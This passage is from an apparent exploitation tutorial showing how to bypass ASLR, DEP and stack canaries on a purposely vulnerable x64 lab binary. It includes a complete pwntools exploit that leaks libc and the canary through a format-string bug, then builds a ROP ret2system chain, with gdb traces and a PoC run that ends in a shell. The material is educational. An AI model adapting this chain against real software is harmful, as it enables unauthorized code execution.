   0x0000000000400799 &lt;+51&gt;:	lea    rax,[rbp-0x210]
   0x00000000004007a0 &lt;+58&gt;:	mov    rdi,rax				; user input is copied to rdi for printing
   0x00000000004007a3 &lt;+61&gt;:	mov    eax,0x0
   0x00000000004007a8 &lt;+66&gt;:	call   0x400620 &lt;printf@plt&gt;		; buf contents are printed
   0x00000000004007ad &lt;+71&gt;:	nop
   0x00000000004007ae &lt;+72&gt;:	mov    rax,QWORD PTR [rbp-0x8]		; stack canary check routine starts
   0x00000000004007b2 &lt;+76&gt;:	xor    rax,QWORD PTR fs:0x28
   0x00000000004007bb &lt;+85&gt;:	je     0x4007c2 &lt;itIsJustASmallLeakSir+92&gt;
   0x00000000004007bd &lt;+87&gt;:	call   0x400600 &lt;__stack_chk_fail@plt&gt;	; stack canary check failure
   0x00000000004007c2 &lt;+92&gt;:	leave  
   0x00000000004007c3 &lt;+93&gt;:	ret    										    ; return to main
End of assembler dump.
</code></pre>
<p>Lastly we take a look at <code>trustMeIAmAnEngineer()</code></p>
<pre><code class="lang-auto">gdb-peda$ disassemble trustMeIAmAnEngineer 
Dump of assembler code for function trustMeIAmAnEngineer:
   0x00000000004007c4 &lt;+0&gt;:	push   rbp
   0x00000000004007c5 &lt;+1&gt;:	mov    rbp,rsp
   0x00000000004007c8 &lt;+4&gt;:	sub    rsp,0x410
   0x00000000004007cf &lt;+11&gt;:	mov    rax,QWORD PTR fs:0x28		; stack canary right here
   0x00000000004007d8 &lt;+20&gt;:	mov    QWORD PTR [rbp-0x8],rax
   0x00000000004007dc &lt;+24&gt;:	xor    eax,eax
   0x00000000004007de &lt;+26&gt;:	lea    rax,[rbp-0x410]		        ; stack setup
   0x00000000004007e5 &lt;+33&gt;:	mov    edx,0x800
   0x00000000004007ea &lt;+38&gt;:	mov    rsi,rax
   0x00000000004007ed &lt;+41&gt;:	mov    edi,0x0
   0x00000000004007f2 &lt;+46&gt;:	mov    eax,0x0
   0x00000000004007f7 &lt;+51&gt;:	call   0x400630 &lt;read@plt&gt;		; user input is read
   0x00000000004007fc &lt;+56&gt;:	nop
   0x00000000004007fd &lt;+57&gt;:	mov    rax,QWORD PTR [rbp-0x8]		; stack canary check routine starts
   0x0000000000400801 &lt;+61&gt;:	xor    rax,QWORD PTR fs:0x28
   0x000000000040080a &lt;+70&gt;:	je     0x400811 &lt;trustMeIAmAnEngineer+77&gt;
   0x000000000040080c &lt;+72&gt;:	call   0x400600 &lt;__stack_chk_fail@plt&gt;	; stack canary check failure
   0x0000000000400811 &lt;+77&gt;:	leave  
   0x0000000000400812 &lt;+78&gt;:	ret    										    ; return to main
End of assembler dump.
gdb-peda$ 
</code></pre>
<hr>
<p>As you can see, compared to last time, nothing much changed, except that it is a x64 binary this time around.<br>
All other parts should be known by now!</p>
<h3><a name="p-21375-h-64-bit-exploitation-crash-course-16" class="anchor" href="https://d.clarkee.co.uk#p-21375-h-64-bit-exploitation-crash-course-16"></a>64-bit exploitation crash course</h3>
<p>Let’s do a really short introduction to x64 exploitation.<br>
My last two articles only covered x86 PoCs so let’s step up the game a bit further.<br>
Not too much will change, but let’s get everyone roughly on the same level before continuing.</p>
<h4><a name="p-21375-registers-17" class="anchor" href="https://d.clarkee.co.uk#p-21375-registers-17"></a>Registers</h4>
<p>In x86 we have 8 general purpose registers <code>eax, ebx, ecx, edx, ebp, esp, esi, edi</code>.<br>
On x64 these got extended to 64-bits ( prefix got changed from ‘e’ to ‘r’ ) and 8 other registers <code>r8, r9, r10, r11, r12, r13, r14, r15</code> got added.</p>
<h4><a name="p-21375-function-arguments-18" class="anchor" href="https://d.clarkee.co.uk#p-21375-function-arguments-18"></a>Function arguments</h4>
<p>According to the <a href="https://raw.githubusercontent.com/wiki/hjl-tools/x86-psABI/x86-64-psABI-1.0.pdf">Application Binary Interface (ABI)</a>, the first 6 integer or pointer arguments to a function are passed in registers.<br>
The first argument is placed in <code>rdi</code>, the second in <code>rsi</code>, the third in <code>rdx</code>, and then <code>rcx, r8 and r9</code>.<br>
Only the 7th argument and onwards are passed on the stack!<br>
<code>r10</code> is used as a static chain pointer in case of nested functions.</p>
<h4><a name="p-21375-extra-return-oriented-programming-rop-primer-19" class="anchor" href="https://d.clarkee.co.uk#p-21375-extra-return-oriented-programming-rop-primer-19"></a>Extra: Return Oriented Programming (ROP) primer</h4>
<p>The basic idea behind return oriented programming is that you chain together small ‘gadgets’.<br>
A gadget is a short instruction sequence always ending with some kind of control flow manipulation to invoke the next gadget in the chain.<br>
Most of the times this is a simple <code>ret</code>.<br>
Once we execute a <code>ret</code>, the address of the next gadget off the stack is popped and control flow jumps to that address.<br>
In particular, ROP is useful for circumventing Address Space Layout Randomization and DEP to gain e.g. arbitrary code execution of some form.</p>
<pre><code>	                                            very basic ROP scheme
	
	                          +--------------------------------------------------+
	                          |                 process memory                   |
	                          +--------------------------------------------------+
	                          +--------------------------------------------------+
	                          |                                                  |
	                          |                    Stack                         |
	                          |                                                  |
	                          |                                                  |
	                          |            +-----------------------+             |
	                     +-----------------+  return address 3     &lt;------------------------+
	                     |    |            +-----------------------+             |          |
	          +----------------------------+  return address 2     &lt;-----------------+      |
	          |          |    |            +-----------------------+             |   |      |
	+--------------------------------------+  return address 1     |             |   |      |
	|         |          |    |            +-----------------------+ &lt;---+ SP    |   |      |
	|         |          |    |                                                  |   |      |
	|         |          |    +--------------------------------------------------+   |      |
	|         |          |    |                                                  |   |      |
	|         |          |    |                                                  |   |      |
	|         |          |    |                                                  |   |      |
	|         |          |    |                                                  |   |      |
	|         |          |    |                                                  |   |      |
	|         |          |    +--------------------------------------------------+   |      |
	|         |          |    |                   Libraries                      |   |      |
	|         |          |    |                                                  |   |      |
	|         |          |    |      +----------------------------------+        |   |      |
	|         |          +-----------&gt;  instruction sequence; ret       +--------------------------&gt; ...
	|         |               |      +----------------------------------+        |   |      |
	|         +----------------------&gt;  instruction sequence; ret       +-------------------+
	|                         |      +----------------------------------+        |   |
	+--------------------------------&gt;  instruction sequence; ret       +------------+
	                          |      +----------------------------------+        |
	                          +--------------------------------------------------+
	                          |                                                  |
	                          +--------------------------------------------------+
	                          |                      Code                        |
	                          +--------------------------------------------------+
</code></pre>
<blockquote>
<p>Note: If you want to get even more familiar with ROP check the challenge section of the forum. Multiple writeups of different complexity are waiting to be found.</p>
</blockquote>
<p>We can find gadgets in numerous ways.<br>
The easiest way might be to use one of the already existing tools like <a href="https://github.com/sashs/ropper">ropper</a>.<br>
For our binary above the shortened output looks like:</p>
<pre><code class="lang-auto">$ ropper2 --file ./vuln_x64 
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%


Gadgets
=======

0x00000000004006c2: adc byte ptr [rax], ah; jmp rax; 
0x000000000040090f: add bl, dh; ret; 
0x0000000000400754: add byte ptr [rax - 0x7b], cl; sal byte ptr [rcx + rsi*8 + 0x55], 0x48; mov ebp, esp; call rax; 
0x000000000040090d: add byte ptr [rax], al; add bl, dh; ret; 
0x0000000000400752: add byte ptr [rax], al; add byte ptr [rax - 0x7b], cl; sal byte ptr [rcx + rsi*8 + 0x55], 0x48; mov ebp, esp; call rax; 
0x000000000040090b: add byte ptr [rax], al; add byte ptr [rax], al; add bl, dh; ret; 
[...]
0x0000000000400912: add byte ptr [rax], al; sub rsp, 8; add rsp, 8; ret; 
0x000000000040088e: add byte ptr [rax], al; leave; ret; 
0x000000000040088f: add cl, cl; ret; 
0x0000000000400734: add eax, 0x200936; add ebx, esi; ret; 
0x000000000040080b: add eax, 0xfffdefe8; dec ecx; ret; 
[...]
0x00000000004005bd: add rsp, 8; ret; 
0x0000000000400737: and byte ptr [rax], al; add ebx, esi; ret; 
0x0000000000400886: call 0x5f0; mov eax, 0; leave; ret; 
0x00000000004007bd: call 0x600; leave; ret; 
[...]
0x00000000004006d0: pop rbp; ret; 
0x0000000000400903: pop rdi; ret; 
0x0000000000400901: pop rsi; pop r15; ret; 
0x00000000004008fd: pop rsp; pop r13; pop r14; pop r15; ret; 
0x000000000040075a: push rbp; mov rbp, rsp; call rax; 
0x0000000000400757: sal byte ptr [rcx + rsi*8 + 0x55], 0x48; mov ebp, esp; call rax; 
0x0000000000400915: sub esp, 8; add rsp, 8; ret; 
0x0000000000400914: sub rsp, 8; add rsp, 8; ret; 
0x00000000004006ca: test byte ptr [rax], al; add byte ptr [rax], al; add byte ptr [rax], al; pop rbp; ret; 
0x0000000000400759: int1; push rbp; mov rbp, rsp; call rax; 
0x00000000004007c2: leave; ret; 
0x00000000004005c1: ret; 

63 gadgets found

</code></pre>
<p>You can see that in our small binary over 60 unique gadgets are already present.<br>
Now all that’s left is chaining the right ones together <img src="https://d.clarkee.co.uk/images/emoji/twitter/wink.png?v=15" title=":wink:" class="emoji" alt=":wink:" loading="lazy" width="20" height="20"> .<br>
In our case this won’t be as complicated, but depending on the binary you want to exploit this task can be a real hassle!</p>
<h3><a name="p-21375-the-exploit-20" class="anchor" href="https://d.clarkee.co.uk#p-21375-the-exploit-20"></a>The exploit</h3>
<pre data-code-wrap="python"><code class="lang-python">#!/usr/bin/env python2

import argparse
from pwn import *
from pwnlib import *

context.binary = ELF('./binaries/vuln_x64')
context.log_level = 'DEBUG'

libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')

pop_rdi_ret_gadget = 0x0000000000400903


def prepend_0x_to_hex_value(value):
    full_hex = '0x' + value
    return full_hex


def cast_hex_to_int(hex_value):
    return int(hex_value, 16)


def get_libc_base_address(leak_dump):
    random_libc_address = leak_dump.split('.')[1]
    random_libc_address_with_0x_prepended = prepend_0x_to_hex_value(random_libc_address)
    print '[*] leaked position within libc is at %s' % random_libc_address_with_0x_prepended
    libc_to_int = cast_hex_to_int(random_libc_address_with_0x_prepended)
    libc_base = hex(libc_to_int - 0x3c6790)                                             # offset found through debugging
    print "[=&gt;] That puts the libc base address at %s" % libc_base
    return cast_hex_to_int(libc_base)


def get_canary_value(leak_dump):
    canary_address = leak_dump.split('.')[70]
    full_canary_value = prepend_0x_to_hex_value(canary_address)
    print '[+] Canary value is: %s' % full_canary_value
    canary_to_int = cast_hex_to_int(full_canary_value)
    return canary_to_int


def leak_all_the_things():
    payload = ''
    payload += '%llx.'*71
    return payload


def get_system_in_glibc(libc_base):
    print("[+] system@libc has offset: {}".format(hex(libc.symbols['system'])))
    system_call = libc_base + libc.symbols['system']
    print("[+] This puts the system call to {}".format(hex(system_call)))
    return system_call


def get_bin_sh_in_glibc(libc_base):
    bin_sh = int(libc.search("/bin/sh").next())
    print("[+] /bin/sh located @ offset {}".format(hex(bin_sh)))
    shell_addr = libc_base + bin_sh
    print("[+] This puts the shell to {}".format(hex(shell_addr)))
    return shell_addr


def get_cyclic_pattern(length):
    pattern = cyclic(length)
    return pattern


def create_payload(canary, system, shell):
    junk_pattern = get_cyclic_pattern(1032)
    payload = ''
    payload += junk_pattern					# junk pattern to fill buffer
    payload += p64(canary)					# place canary at the right position
    payload += 'AAAAAAAA'					# overwrite RBP with some junk
    payload += p64(pop_rdi_ret_gadget)		# overwrite RIP with the address of our ROP gadget 
    payload += p64(shell)					# pointer to /bin/sh in libc
    payload += p64(system)					# system@glibc
    return payload


def main():
    parser = argparse.ArgumentParser(description='pwnage')
    parser.add_argument('--dbg', '-d', action='store_true')
    args = parser.parse_args()

    exe = './binaries/vuln_x64'

    format_string_leak = leak_all_the_things()

    if args.dbg:
        r = gdb.debug([exe], gdbscript="""      
                b *trustMeIAmAnEngineer+56   
                continue
                """)
    else:
        r = process([exe])

    r.recvuntil("$&gt; ")
    r.sendline(format_string_leak)

    leak = r.recvline()

    print '[+] Format string leak:\n [%s]\n' % leak.rsplit("\n")[0]

    libc_base = get_libc_base_address(leak)
    system_call = get_system_in_glibc(libc_base)
    bin_sh = get_bin_sh_in_glibc(libc_base)
    canary = get_canary_value(leak)

    payload = create_payload(canary, system_call, bin_sh)

    r.recvuntil("$&gt; ")
    r.sendline(payload)

    r.interactive()


if __name__ == '__main__':
    main()
    sys.exit(0)

</code></pre>
<p>The exploit itself should be quite self explanatory, but let’s quickly walk through it together.<br>
So first of all when launching the binary we wait for it to prompt us for the first input.<br>
When this happens we provide a bunch of format specifiers <code>%llx.</code> to get a leak from memory.</p>
<blockquote>
<p>Recall: %llx. format string is a long long-sized integer</p>
</blockquote>
<p>The leak will look something like this:</p>
<pre><code>1.7f6c3501b790.a.0.7f6c35219700.6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.6c252e786c6c252e.2e786c6c252e786c.6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.6c252e786c6c252e.2e786c6c252e786c.6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.6c252e786c6c252e.2e786c6c252e786c.6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.6c252e786c6c252e.2e786c6c252e786c.6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.6c252e786c6c252e.2e786c6c252e786c.6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.6c252e786c6c252e.2e786c6c252e786c.6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.6c252e786c6c252e.2e786c6c252e786c.6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.6c252e786c6c252e.2e786c6c252e786c.6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.6c252e786c6c252e.7ffd002e786c.7f6c35019b78.7f6c3501b780.7f6c35244ca0.7f6c3501b780.1.ff000000000000.7f6c3501a620.0.7f6c3501a620.7f6c3501a6a4.7f6c3501a6a3.7ffdc2a905a0.7f6c34cd09e6.7f6c3501a620.0.0.7f6c34ccd439.7f6c3501a620.7f6c34cc4d94.0.5b9cf8225c7bc900.
</code></pre>
<p>It turned out that the 2nd leaked value is a random address within libc.<br>
Since we got that one we were able to calculate the base address of libc by looking up the libc mapping of the current process from within gdb.</p>
<pre><code class="lang-auto">gdb-peda$ vmmap
Start              End                Perm	Name
0x00400000         0x00401000         r-xp	/home/lab/Git/RE_binaries/0x00sec/ASLR/binaries/vuln_x64
0x00600000         0x00601000         r--p	/home/lab/Git/RE_binaries/0x00sec/ASLR/binaries/vuln_x64
0x00601000         0x00602000         rw-p	/home/lab/Git/RE_binaries/0x00sec/ASLR/binaries/vuln_x64
0x01d12000         0x01d33000         rw-p	[heap]
0x00007f6c34c55000 0x00007f6c34e15000 r-xp	/lib/x86_64-linux-gnu/libc-2.23.so
0x00007f6c34e15000 0x00007f6c35015000 ---p	/lib/x86_64-linux-gnu/libc-2.23.so
0x00007f6c35015000 0x00007f6c35019000 r--p	/lib/x86_64-linux-gnu/libc-2.23.so
0x00007f6c35019000 0x00007f6c3501b000 rw-p	/lib/x86_64-linux-gnu/libc-2.23.so
0x00007f6c3501b000 0x00007f6c3501f000 rw-p	mapped
0x00007f6c3501f000 0x00007f6c35045000 r-xp	/lib/x86_64-linux-gnu/ld-2.23.so
0x00007f6c35218000 0x00007f6c3521b000 rw-p	mapped
0x00007f6c35244000 0x00007f6c35245000 r--p	/lib/x86_64-linux-gnu/ld-2.23.so
0x00007f6c35245000 0x00007f6c35246000 rw-p	/lib/x86_64-linux-gnu/ld-2.23.so
0x00007f6c35246000 0x00007f6c35247000 rw-p	mapped
0x00007ffdc2a72000 0x00007ffdc2a93000 rw-p	[stack]
0x00007ffdc2a98000 0x00007ffdc2a9b000 r--p	[vvar]
0x00007ffdc2a9b000 0x00007ffdc2a9d000 r-xp	[vdso]
0xffffffffff600000 0xffffffffff601000 r-xp	[vsyscall]
gdb-peda$ 
</code></pre>
<p>We can see that the randomized base address for the used libc starts at <code>0x7f6c34c55000</code>.<br>
If we substract this value from the random libc leak we get the offset.<br>
This value marks the offset of the random libc address from the base address of libc.<br>
We can use exactly this offset value for any future execution to find our libc base address.<br>
This works, since we may have a fully randomized process memory and with that a randomized libc position in memory, but the offset of things within libraries is not changed and always has the same distance from the base address!<br>
Hence calculating the randomized base address of libc with a static offset value is working 100% of the time.<br>
All of this base calculation happens in <code>get_libc_base_address(leak_dump)</code>.</p>
<p>Having access to libc is like opening the box of the pandora.<br>
So much useful functions in there.<br>
I chose to go the <code>ret2system</code> way and calculated the address of <code>system()</code> and a pointer to <code>/bin/sh</code> from the libc base address.<br>
All of that happens in <code>get_system_in_glibc(libc_base)</code> and <code>get_bin_sh_in_glibc(libc_base)</code>.</p>
<p>A really valuable information happened to be at the 71th position in the leaked data.<br>
We got our stack canary, which we need to successfully leverage a buffer overflow!<br>
This one is especially easy to spot since its a 16 bit value where the 2 least significant bits are both 0.<br>
I just extracted the value from the dump in <code>get_canary_value(leak_dump)</code>.</p>
<p>All that is left now is putting it all together.<br>
This happens in <code>create_payload(canary, system, shell)</code>.<br>
I’m filling the buffer until right before it overflows in the stack canary.<br>
Then I’m appending the canary value and continue to overwrite the <code>RBP</code> with some junk, since it’s irrelevant what we put here for the PoC.<br>
Afterwards our little friend the <code>pop rdi; ret</code> gadget is put onto the stack.<br>
Lastly a pointer to our wanted shell and the system call itself are added.</p>
<p>Let’s visualize this in gdb.<br>
Right when we hit the <code>ret</code> instruction in <code>trustMeIAmAnEngineer</code> after our buffer overflow happened our registers and stack look like this:</p>
<pre><code class="lang-auto">[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x7f6c34d4c260 (&lt;__read_nocancel+7&gt;:	cmp    rax,0xfffffffffffff001)
RDX: 0x800 
RSI: 0x7ffdc2a90090 ("aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab"...)
RDI: 0x0 
RBP: 0x4141414141414141 ('AAAAAAAA')
RSP: 0x7ffdc2a904a8 --&gt; 0x400903 (&lt;__libc_csu_init+99&gt;:	pop    rdi)
RIP: 0x400812 (&lt;trustMeIAmAnEngineer+78&gt;:	ret)
R8 : 0x7f6c35219700 (0x00007f6c35219700)
R9 : 0x3 
R10: 0x37b 
R11: 0x246 
R12: 0x400670 (&lt;_start&gt;:	xor    ebp,ebp)
R13: 0x7ffdc2a905a0 --&gt; 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x40080a &lt;trustMeIAmAnEngineer+70&gt;:	je     0x400811 &lt;trustMeIAmAnEngineer+77&gt;
   0x40080c &lt;trustMeIAmAnEngineer+72&gt;:	call   0x400600 &lt;__stack_chk_fail@plt&gt;
   0x400811 &lt;trustMeIAmAnEngineer+77&gt;:	leave  
=&gt; 0x400812 &lt;trustMeIAmAnEngineer+78&gt;:	ret    
   0x400813 &lt;main&gt;:	push   rbp
   0x400814 &lt;main+1&gt;:	mov    rbp,rsp
   0x400817 &lt;main+4&gt;:	sub    rsp,0x10
   0x40081b &lt;main+8&gt;:	mov    DWORD PTR [rbp-0x4],edi
[------------------------------------stack-------------------------------------]
0000| 0x7ffdc2a904a8 --&gt; 0x400903 (&lt;__libc_csu_init+99&gt;:	pop    rdi)
0008| 0x7ffdc2a904b0 --&gt; 0x7f6c34de1d57 --&gt; 0x68732f6e69622f ('/bin/sh')
0016| 0x7ffdc2a904b8 --&gt; 0x7f6c34c9a390 (&lt;__libc_system&gt;:	test   rdi,rdi)
0024| 0x7ffdc2a904c0 --&gt; 0x40080a (&lt;trustMeIAmAnEngineer+70&gt;:	je     0x400811 &lt;trustMeIAmAnEngineer+77&gt;)
0032| 0x7ffdc2a904c8 --&gt; 0x7f6c34c75830 (&lt;__libc_start_main+240&gt;:	mov    edi,eax)
0040| 0x7ffdc2a904d0 --&gt; 0x0 
0048| 0x7ffdc2a904d8 --&gt; 0x7ffdc2a905a8 --&gt; 0x7ffdc2a92109 ("./binaries/vuln_x64")
0056| 0x7ffdc2a904e0 --&gt; 0x135244ca0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
gdb-peda$ 
</code></pre>
<p>We can see that all of our final payload is located on the stack.<br>
When executing the <code>ret</code> instruction the next value on the stack is popped and put into <code>RIP</code>.<br>
This will be our <code>pop rdi; ret</code> gadget.<br>
The top of the stack, the <code>RSP</code>, is changed accordingly to point to the next value on the stack, which is the pointer to our shell <code>/bin/sh</code> as well.</p>
<pre><code class="lang-auto">[----------------------------------registers-----------------------------------]
[...]
RBP: 0x4141414141414141 ('AAAAAAAA')
RSP: 0x7ffdc2a904b0 --&gt; 0x7f6c34de1d57 --&gt; 0x68732f6e69622f ('/bin/sh')
RIP: 0x400903 (&lt;__libc_csu_init+99&gt;:	pop    rdi)
[...]
[-------------------------------------code-------------------------------------]
=&gt; 0x400903 &lt;__libc_csu_init+99&gt;:	pop    rdi
   0x400904 &lt;__libc_csu_init+100&gt;:	ret    
   0x400905:	nop
   0x400906:	nop    WORD PTR cs:[rax+rax*1+0x0]
[------------------------------------stack-------------------------------------]
0000| 0x7ffdc2a904b0 --&gt; 0x7f6c34de1d57 --&gt; 0x68732f6e69622f ('/bin/sh')
0008| 0x7ffdc2a904b8 --&gt; 0x7f6c34c9a390 (&lt;__libc_system&gt;:	test   rdi,rdi)
0016| 0x7ffdc2a904c0 --&gt; 0x40080a (&lt;trustMeIAmAnEngineer+70&gt;:	je     0x400811 &lt;trustMeIAmAnEngineer+77&gt;)
0024| 0x7ffdc2a904c8 --&gt; 0x7f6c34c75830 (&lt;__libc_start_main+240&gt;:	mov    edi,eax)
0032| 0x7ffdc2a904d0 --&gt; 0x0 
0040| 0x7ffdc2a904d8 --&gt; 0x7ffdc2a905a8 --&gt; 0x7ffdc2a92109 ("./binaries/vuln_x64")
0048| 0x7ffdc2a904e0 --&gt; 0x135244ca0 
0056| 0x7ffdc2a904e8 --&gt; 0x400813 (&lt;main&gt;:	push   rbp)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
gdb-peda$ 
</code></pre>
<p>Let’s execute <code>pop rdi; ret</code> now, which will put the current top of the stack into <code>RDI</code>, which is our shell pointer.<br>
Since our chosen gadget ends with a <code>ret</code> statment it’s next in the execution flow.<br>
It will continue execution with the next instruction <code>RSP</code> points to, which is our <code>system()</code> call!</p>
<pre><code class="lang-auto">[----------------------------------registers-----------------------------------]
[...]
RDI: 0x7f6c34de1d57 --&gt; 0x68732f6e69622f ('/bin/sh')
RBP: 0x4141414141414141 ('AAAAAAAA')
RSP: 0x7ffdc2a904b8 --&gt; 0x7f6c34c9a390 (&lt;__libc_system&gt;:	test   rdi,rdi)
RIP: 0x400904 (&lt;__libc_csu_init+100&gt;:	ret)
[...]
[-------------------------------------code-------------------------------------]
   0x4008fe &lt;__libc_csu_init+94&gt;:	pop    r13
   0x400900 &lt;__libc_csu_init+96&gt;:	pop    r14
   0x400902 &lt;__libc_csu_init+98&gt;:	pop    r15
=&gt; 0x400904 &lt;__libc_csu_init+100&gt;:	ret    
   0x400905:	nop
   0x400906:	nop    WORD PTR cs:[rax+rax*1+0x0]
   0x400910 &lt;__libc_csu_fini&gt;:	repz ret 
   0x400912:	add    BYTE PTR [rax],al
[------------------------------------stack-------------------------------------]
0000| 0x7ffdc2a904b8 --&gt; 0x7f6c34c9a390 (&lt;__libc_system&gt;:	test   rdi,rdi)
0008| 0x7ffdc2a904c0 --&gt; 0x40080a (&lt;trustMeIAmAnEngineer+70&gt;:	je     0x400811 &lt;trustMeIAmAnEngineer+77&gt;)
0016| 0x7ffdc2a904c8 --&gt; 0x7f6c34c75830 (&lt;__libc_start_main+240&gt;:	mov    edi,eax)
0024| 0x7ffdc2a904d0 --&gt; 0x0 
0032| 0x7ffdc2a904d8 --&gt; 0x7ffdc2a905a8 --&gt; 0x7ffdc2a92109 ("./binaries/vuln_x64")
0040| 0x7ffdc2a904e0 --&gt; 0x135244ca0 
0048| 0x7ffdc2a904e8 --&gt; 0x400813 (&lt;main&gt;:	push   rbp)
0056| 0x7ffdc2a904f0 --&gt; 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
gdb-peda$ 
</code></pre>
<p>Remember what I introduced in the x64 exploitation crash course?<br>
The first function argument on x64 <em>needs</em> to be put in <code>RDI</code>.<br>
We managed to place our pointer to <code>/bin/sh</code> there.<br>
And that’s all actually!<br>
Next <code>system()</code> is called with the contents of <code>RDI</code> as a function argument that gets us a shell.</p>
<blockquote>
<p>Alternative PoC: vmmap reveals that our stack ends at 0x00007ffdc2a93000 the 62th value in the leak is within the stack frame (0x7ffdc2a905a0). We  could leverage this to call <code>mprotect()</code> on the stack to make him executable again too!</p>
</blockquote>
<h3><a name="p-21375-poc-21" class="anchor" href="https://d.clarkee.co.uk#p-21375-poc-21"></a>PoC</h3>
<pre><code class="lang-auto">$ cat /proc/sys/kernel/randomize_va_space
2

$ python defeat_ASLR_x64.py INFO         
[*] '/home/lab/Git/RE_binaries/0x00sec_WIP/ASLR/binaries/vuln_x64_3'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/lib/x86_64-linux-gnu/libc-2.23.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process './binaries/vuln_x64_3': pid 18749
[+] Format string leak:
 [1.7f6e0caee790.a.0.7f6e0cceb700.6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.6c252e786c6c252e.2e786c6c252e786c.6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.6c252e786c6c252e.2e786c6c252e786c.6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.6c252e786c6c252e.2e786c6c252e786c.6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.6c252e786c6c252e.2e786c6c252e786c.6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.6c252e786c6c252e.2e786c6c252e786c.6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.6c252e786c6c252e.2e786c6c252e786c.6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.6c252e786c6c252e.2e786c6c252e786c.6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.6c252e786c6c252e.2e786c6c252e786c.6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.6c252e786c6c252e.7ffd002e786c.7f6e0caecb78.7f6e0caee780.7f6e0cd17ca0.7f6e0caee780.1.0.7f6e0caed620.0.7f6e0caed620.7f6e0caed6a4.7f6e0caed6a3.7ffdd976dcf0.7f6e0c7a39e6.7f6e0caed620.0.0.7f6e0c7a0439.7f6e0caed620.7f6e0c797d94.0.87ec97b667e1eb00.]

[*] leaked position within libc is at 0x7f6e0caee790
[=&gt;] That puts the libc base address at 0x7f6e0c728000
[+] system@libc has offset: 0x45390
[+] This puts the system call to 0x7f6e0c76d390
[+] /bin/sh located @ offset 0x18cd57
[+] This puts the shell to 0x7f6e0c8b4d57
[+] Canary value is: 0x87ec97b667e1eb00
[*] Switching to interactive mode
$ whoami
lab
$  
</code></pre>
<hr>
<h2><a name="p-21375-conclusion-22" class="anchor" href="https://d.clarkee.co.uk#p-21375-conclusion-22"></a>Conclusion</h2>
<p>Address space layout randomization and position independent executables fully randomize the adress space of any executed binary and were implemented not just as another “final defense against attack X” mechanism, but to make exploiting in general a lot more difficult.<br>
The introduced randomness breaks any of the <em>static</em> exploit approaches taken before and made the game a lot more difficult.</p>
<p>But the found design flaws especially on 32 bit operating systems reduce the viability of this technique by quite a lot.<br>
Luckily the era of 32 bit OSes comes to an end nowadays, at least in the desktop and server area, IoT is another topic <img src="https://d.clarkee.co.uk/images/emoji/twitter/slight_smile.png?v=15" title=":slight_smile:" class="emoji" alt=":slight_smile:" loading="lazy" width="20" height="20"> …</p>
<p>The showed PoC introduced x64 exploitation as well as showed how a possible bypass against an ASLR, DEP and stack canary hardened binary <em>can</em> look like.<br>
The used vulnerabilities were more than obvious and real life exploitation is (most often) a lot more difficult, but I think the general idea was conveyed in an easy to digest manner.<br>
At best you have an awesome memory leak, which gets you sone libc address and maybe even the canary.<br>
If RELRO is not fully enabled and we have a viable format string vulnerability at hand we can try to overwrite the entries within the GOT.<br>
PIE makes building ROP chains quite a bit more complex and was left out for the sake of understandability.</p>
<p>Last but not least I hope you enjoyed the reading and as always I would appreciate your feedback to make future articles better!</p>
<p>-ricksanchez</p>
<hr>
<h2><a name="p-21375-sources-23" class="anchor" href="https://d.clarkee.co.uk#p-21375-sources-23"></a>Sources</h2>
<h3><a name="p-21375-previous-articles-24" class="anchor" href="https://d.clarkee.co.uk#p-21375-previous-articles-24"></a>Previous articles</h3>
<ul>
<li><a href="https://0x00sec.org/t/exploit-mitigation-techniques-data-execution-prevention-dep/">Data Execution Prevention</a></li>
<li><a href="https://0x00sec.org/t/exploit-mitigation-techniques-stack-canaries/">Stack Canaries</a></li>
</ul>
<h3><a name="p-21375-references-25" class="anchor" href="https://d.clarkee.co.uk#p-21375-references-25"></a>References</h3>
<ul>
<li><a href="https://insights.sei.cmu.edu/cert/2014/02/differences-between-aslr-on-windows-and-linux.html">Differences Between ASLR on Windows and Linux</a></li>
<li><a href="https://access.redhat.com/blogs/766093/posts/1975793">Position Independent Executables (PIE)</a></li>
<li><a href="https://www.blackhat.com/docs/us-16/materials/us-16-Jang-Breaking-Kernel-Address-Space-Layout-Randomization-KASLR-With-Intel-TSX-wp.pdf">Breaking Kernel Address Space Layout Randomization with Intel TSX</a></li>
<li><a href="https://kernelnewbies.org/Linux_2_6_12">ASLR support for Linux</a></li>
<li><a href="https://kernelnewbies.org/Linux_3.14">kernel ASLR (kASLR) support for Linux</a></li>
